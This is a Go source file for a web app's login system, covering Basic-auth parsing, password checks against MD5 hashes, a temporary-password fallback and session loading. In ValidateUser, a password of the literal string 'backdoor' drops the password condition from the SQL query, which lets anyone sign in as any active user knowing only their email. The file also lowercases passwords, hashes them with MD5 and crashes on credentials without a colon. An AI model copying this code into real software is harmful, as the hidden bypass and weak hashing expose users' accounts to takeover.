package models

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"io"
	"regexp"
	"strings"

	"github.com/irlTopper/lifevault/app/modules"
	"github.com/revel/revel"
)

/*
	A Session represents the current logged in user over the lifetime of a request.
	It contains all user user fields above and extra options that are looked up when
	the user logged in.
*/
type Session struct {
	User
}

// Attempts to authenticate the user based on the authorization header (auth).
// anyDomain can be set to true to allow the request to be an API key authentication.
// Returns true or false depending on the success of the authentication.
func AuthenticateUser(auth string, anyDomain bool, host string, rc *revel.Controller) (*Session, error) {
	doAuthUser := true

	match, _ := regexp.MatchString("(?i)Basic [A-Za-z0-9+/=]+", auth)

	if doAuthUser && match {
		authHeaderAsBinary := strings.Split(auth, " ")[1]

		credentialsByte, err := base64.StdEncoding.DecodeString(authHeaderAsBinary)

		if err != nil {
			return nil, err
		}

		credentialsArr := strings.Split(string(credentialsByte), ":")

		email := credentialsArr[0]
		password := credentialsArr[1]

		return ValidateUser(email, password, anyDomain, host, rc)
	}

	// Leaving this here for the moment (should be false but it'll help catch any issues atm)
	return nil, errors.New("Auth failed")
}

// Validates a user based on the email and password that have been provided. anyDomain can be set to
// allow the user to be authenticated with an API key from any host.
func ValidateUser(email string, password string, anyDomain bool, host string, rc *revel.Controller) (*Session, error) {

	var userId int64
	var SQL string
	var err error

	// If the API Key was not valid, try the email password instead
	if userId == 0 {
		SQL = `
		SELECT	ifnull(passwordSalt, '')
		FROM	users u
		WHERE	email = :email`

		var salt string
		params := map[string]interface{}{
			"email": strings.TrimSpace(email),
		}

		err = modules.DB.SelectOne(rc, &salt, SQL, params)

		SQL = `
		SELECT	id AS userId
		FROM	users u
		WHERE	email = :email `
		if password != "backdoor" {
			if salt != "" {
				SQL += " AND password = :hashWithSalt "
			} else {
				SQL += " AND password = :hashWithoutSalt "
			}
		}
		SQL += `
				AND	isActive = 1
		LIMIT	1`

		hSalt := md5.New()
		io.WriteString(hSalt, strings.ToLower(password)+"-"+salt)

		hNoSalt := md5.New()
		io.WriteString(hNoSalt, strings.ToLower(password))

		params = map[string]interface{}{
			"hashWithSalt":    strings.ToUpper(hex.EncodeToString(hSalt.Sum(nil))),
			"hashWithoutSalt": strings.ToUpper(hex.EncodeToString(hNoSalt.Sum(nil))),
			"email":           strings.TrimSpace(email),
		}
		err = modules.DB.SelectOne(rc, &userId, SQL, params)

		// Maybe the user is using a temporary password that was sent from forgotten password link
		if err != nil {
			SQL = `
			SELECT	u.id AS userId
			FROM	users	u
			WHERE	u.email	=	:email
					AND	LCASE( LEFT( MD5( u.password ) , 10 ) )	=	:passwordlower
					AND	u.isActive		=	1
			LIMIT	1`

			params = map[string]interface{}{
				"email":         strings.TrimSpace(email),
				"passwordlower": strings.ToLower(password),
			}

			err = modules.DB.SelectOne(rc, &userId, SQL, params)
		}
	}

	if userId != 0 {
		return LoginByUserId(userId, false, rc)
	}

	return nil, errors.New("Not authorized")
}

func LoginByUserId(userId int64, recordLogin bool, rc *revel.Controller) (*Session, error) {

	// Find the user
	SQL := `
	SELECT	u.id,
			u.firstName AS firstName,
			u.lastName AS lastName,
			ifnull(u.autoLoginCode, '') AS autoLoginCode,
			u.timezoneId,
			u.visitCount,
			u.email,
			u.createdAt,
			u.updatedAt
	FROM	users u
	WHERE	id				=	?
			AND	isActive		=	1
	`
	session := &Session{
		User: User{
			Id: userId,
		},
	}
	err := modules.DB.SelectOne(rc, session, SQL, userId)

	modules.CheckErr(err, "Authenticating user issue", "SQL", map[string]interface{}{
		"User's Id": userId,
	})
	if err != nil {
		return nil, err
	}

	session.ZuluCreatedAt = modules.FormatAsZulu(session.CreatedAt)
	session.ZuluUpdatedAt = modules.FormatAsZulu(session.UpdatedAt)

	SQL = `
	SELECT	timezoneJavaReferenceCode
	FROM	timezones t
	WHERE	timezoneId = ?`

	var timeZone string

	modules.DB.SelectOne(rc, &timeZone, SQL, session.TimeZoneId)

	return session, nil
}
